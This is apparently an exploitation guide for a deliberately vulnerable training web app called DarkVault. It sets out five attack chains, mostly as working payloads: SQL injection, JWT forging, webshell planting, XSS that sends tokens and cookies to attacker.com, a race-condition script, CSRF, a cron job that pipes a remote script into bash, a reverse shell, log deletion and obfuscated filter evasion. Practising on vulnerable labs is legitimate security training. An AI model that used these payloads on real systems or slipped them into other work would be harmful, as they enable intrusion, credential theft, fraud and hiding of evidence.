# Advanced Vulnerability Chains in DarkVault

This document outlines sophisticated vulnerability chains that combine multiple weaknesses in DarkVault to achieve complex attacks. Each chain is documented with detailed steps for exploitation.

## 1. Complete Privilege Escalation Chain

**Objective**: Gain admin access, extract all user data, and establish persistent access

### Step 1: Initial Access via SQL Injection
1. Navigate to the login page
2. Enter username: `admin" --`
3. Enter any password
4. Submit the login form
5. You now have access as the admin user

### Step 2: Extract User Credentials
1. Visit the debug endpoint: `http://localhost:3000/api/debug/users`
2. Save all user credentials for later use
3. Alternatively, use the SQL injection in search: 
   ```
   " UNION SELECT id, username, password FROM users --
   ```

### Step 3: JWT Token Manipulation
1. Extract your JWT token from localStorage:
   ```javascript
   const token = localStorage.getItem('token');
   console.log(token);
   ```
2. Decode the token at https://jwt.io
3. Modify the payload to set `role` to `admin` if not already admin
4. Re-sign the token with the known secret: `darkvault-super-secret-key`
5. Replace the token in localStorage:
   ```javascript
   localStorage.setItem('token', 'YOUR_MODIFIED_TOKEN');
   ```

### Step 4: Command Injection for Persistence
1. Navigate to the admin dashboard
2. Access the "Run Report" feature
3. Enter this payload as the report name:
   ```
   fake; echo '<?php system($_GET["cmd"]); ?>' > ../public/backdoor.php
   ```
4. Execute the report
5. Now you can access `http://localhost:3000/backdoor.php?cmd=whoami` to run commands

### Step 5: Extract All Sensitive Data
1. Use your backdoor to dump the entire database:
   ```
   http://localhost:3000/backdoor.php?cmd=sqlite3 database.db .dump > /tmp/dump.txt
   ```
2. Download the dump:
   ```
   http://localhost:3000/backdoor.php?cmd=cat /tmp/dump.txt
   ```

## 2. Data Exfiltration via XSS and Headless Browser

**Objective**: Plant XSS payloads that steal admin credentials when processed by automated systems

### Step 1: Identify XSS Vulnerability
1. Log in as any user (e.g., alice with password123)

### Step 2: Plant Stored XSS in Transaction Notes
1. Navigate to the transfer funds page
2. Create a transfer to another user (e.g., Bob)
3. In the note field, add this payload:
   ```html
   <script>
   fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
   </script>
   ```
4. Complete the transfer

### Step 3: Set Up Attacker Server to Receive Data
1. Use a service like RequestBin or set up your own server
2. Replace 'https://attacker.com/steal' with your actual endpoint
3. The server should log all incoming requests

### Step 4: Exploit Headless Browser Admin Bot
1. Submit feedback with an XSS payload in the email or message field:
   ```html
   <img src=x onerror="fetch('https://attacker.com/admin?token='+localStorage.token+'&prefs='+localStorage.adminPreferences)">
   ```
2. Wait for the headless browser bot to process your feedback (runs every 7 minutes)
3. Check your attacker server for incoming requests with admin credentials

### Step 5: Use Stolen Admin Token
1. Take the admin token from your attacker server logs
2. Set it in your browser:
   ```javascript
   localStorage.setItem('token', 'STOLEN_ADMIN_TOKEN');
   ```
3. Refresh the page to gain admin access
4. You now have access to all admin features with the token

### Step 6: Extract Sensitive Data via Second-Order SQL Injection
1. Update your user profile with this payload in the location field:
   ```
   New York" UNION SELECT group_concat(username||':'||password) FROM users --
   ```
2. Access the admin user report, which will execute your injection
3. The report will contain concatenated username:password pairs

## 3. Lateral Movement and Persistence Chain

**Objective**: Bypass authentication, move between accounts, and establish persistent access

### Step 1: Bypass Authentication with Debug Parameter
1. Access protected endpoint with debug parameter:
   ```
   http://localhost:3000/api/users/1?debug=true
   ```
2. You now have access as if you're authenticated as admin

### Step 2: Exploit IDOR to Access Other Profiles
1. Change the user ID in the URL to access other profiles:
   ```
   http://localhost:3000/api/users/2?debug=true
   http://localhost:3000/api/users/3?debug=true
   ```
2. Document information from each profile

### Step 3: Plant Stored XSS for Admin Bot
1. Using the debug parameter, update a user's profile with an XSS payload:
   ```
   http://localhost:3000/api/users/update-profile?debug=true
   ```
2. Send this payload in the request body:
   ```json
   {
     "userId": 2,
     "bio": "<img src=x onerror=\"fetch('https://attacker.com/admin-cookie?data='+document.cookie)\">",
     "website": "normal.com",
     "location": "New York"
   }
   ```
3. When the admin bot views this profile, it will send the admin's cookies to your server

### Step 4: Plant Webshell via File Upload
1. Use the debug parameter to access the file upload endpoint:
   ```
   http://localhost:3000/api/upload?debug=true
   ```
2. Upload a file named "shell.php" with this content:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. Access your webshell at:
   ```
   http://localhost:3000/uploads/shell.php?cmd=ls
   ```

### Step 5: Create Backdoor User
1. Use your webshell to insert a new admin user:
   ```
   http://localhost:3000/uploads/shell.php?cmd=sqlite3 database.db "INSERT INTO users (username, password, email, role, balance) VALUES ('backdoor', 'backdoor123', 'hack@example.com', 'admin', 999999)"
   ```
2. Login with your backdoor credentials

## 4. Financial Exploitation Chain

**Objective**: Exploit transaction vulnerabilities to steal funds

### Step 1: Identify User Account with Funds
1. Use IDOR to view user profiles and find accounts with high balances:
   ```
   http://localhost:3000/api/users/1?debug=true
   http://localhost:3000/api/users/2?debug=true
   ```

### Step 2: Exploit Negative Amount Transfer
1. Log in as any user (e.g., alice with password123)
2. Intercept the transfer request using a proxy tool (like Burp Suite)
3. Change the amount to a negative value:
   ```json
   {
     "to": 3,
     "amount": -1000,
     "note": "This is a legit transfer"
   }
   ```
4. Submit the request to `/api/transfer`
5. This will increase your balance by $1000 and decrease the recipient's balance

### Step 3: Exploit Race Condition
1. Create a script `race-exploit.js`:
   ```javascript
   const fetch = require('node-fetch');
   
   async function exploitRaceCondition(token, numRequests = 10) {
     const requests = [];
     for (let i = 0; i < numRequests; i++) {
       requests.push(fetch('http://localhost:3000/api/transfer', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
           'Authorization': token
         },
         body: JSON.stringify({
           to: 3,  // Target account ID
           amount: 100,  // Amount to transfer
           note: 'Race condition exploit'
         })
       }));
     }
     
     await Promise.all(requests);
     console.log(`Sent ${numRequests} simultaneous requests`);
   }
   
   // Replace with your actual token
   const token = 'YOUR_JWT_TOKEN';
   exploitRaceCondition(token, 20);
   ```
2. Run the script to send multiple transfer requests simultaneously
3. This bypasses balance checks, allowing you to spend the same money multiple times

### Step 4: Create CSRF Attack for Unattended Transfer
1. Create an HTML file on your machine:
   ```html
   <html>
   <body onload="document.forms[0].submit()">
     <form action="http://localhost:3000/api/transfer" method="POST" target="hidden-frame">
       <input type="hidden" name="to" value="2"> <!-- Your account ID -->
       <input type="hidden" name="amount" value="5000">
       <input type="hidden" name="note" value="CSRF attack">
     </form>
     <iframe name="hidden-frame" style="display:none"></iframe>
   </body>
   </html>
   ```
2. Host this HTML file on a server
3. Trick admin or other users into visiting your page
4. When they visit while logged in to DarkVault, the form auto-submits and transfers funds to your account

## 5. Complete System Takeover Chain

**Objective**: Gain full control of the application server

### Step 1: Information Gathering
1. Use information disclosure via verbose errors:
   ```
   http://localhost:3000/api/users/abc
   ```
2. The error message reveals implementation details about the system

### Step 2: Exploit Prototype Pollution in Lodash
1. Identify that the application uses vulnerable lodash version 4.17.15
2. Send a specially crafted JSON payload to any endpoint that processes JSON:
   ```json
   {
     "__proto__": {
       "toString": "function(){return require('child_process').execSync('curl http://attacker.com/lodash_exploited').toString()}"
     }
   }
   ```
3. This pollutes the Object prototype, enabling arbitrary code execution

### Step 3: Second-Order SQL Injection via Profile
1. Update your user profile with a malicious payload in the location field that extracts secret data:
   ```
   New York" AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM admin_secrets WHERE id=1) THEN 1 ELSE (SELECT UNICODE(SUBSTR((SELECT message FROM admin_secrets WHERE id=1),1,1)) * 0) END)=1 --
   ```
2. This tests if a secret message exists - if it doesn't, the report will error out
3. For data extraction, use a series of blind SQL injection payloads:
   ```
   New York" AND (SELECT CASE WHEN (SELECT SUBSTR(message,1,1) FROM admin_secrets WHERE id=1)='a' THEN 1 ELSE 0/(SELECT 0) END)=1 --
   ```
4. Iterate through positions and possible characters:
   ```
   New York" UNION SELECT 'Secret: ' || (SELECT SUBSTR(message,1,10) FROM admin_secrets) --
   ```
5. When the admin runs user reports, your injected SQL will either:
   - Cause an error (giving you a yes/no response to your condition)
   - OR successfully extract and display data in the report results
6. By analyzing which queries succeed vs fail, you can extract the secret message character by character

### Step 4: Use Path Traversal to Place Files
1. Create a file with a malicious name: `../public/cmd.php`
2. File contents:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. Upload this file using the file upload feature
4. The file will be saved outside the intended directory

### Step 5: Establish Persistent Access
1. Use your backdoor to create a cron job for persistence:
   ```
   http://localhost:3000/cmd.php?cmd=echo "*/5 * * * * curl -s http://attacker.com/backdoor.sh | bash" > /tmp/crontab; crontab /tmp/crontab
   ```
2. Create a reverse shell for direct access:
   ```
   http://localhost:3000/cmd.php?cmd=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
   ```
3. You now have persistent access to the server

## Practical Considerations

### Detection Evasion
- Spread attack steps over time to avoid triggering alerts
- Clear logs after exploitation:
  ```
  http://localhost:3000/cmd.php?cmd=rm -f logs/*
  ```
- Use encoding to bypass simple filters:
  ```
  <script>eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP3Rva2VuPScrbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJykp'));</script>
  ```

### Troubleshooting Common Issues
- If JWT manipulation fails, verify the correct secret key is used
- For XSS payloads, ensure proper encoding for special characters
- For SQL injection, adapt syntax based on error messages
- Race condition exploits may require timing adjustments based on server load

### Indicators of Success
- Successful privilege escalation: Access to admin dashboard
- Successful data exfiltration: Receiving data on your attacker server
- Successful persistence: Ability to reconnect after session expiry
- Successful financial exploitation: Increased account balance

## Conclusion

These advanced vulnerability chains demonstrate how individual vulnerabilities can be combined to create sophisticated attack scenarios. In a real application, defenders would need to address not only individual vulnerabilities but also consider how they might be chained together. 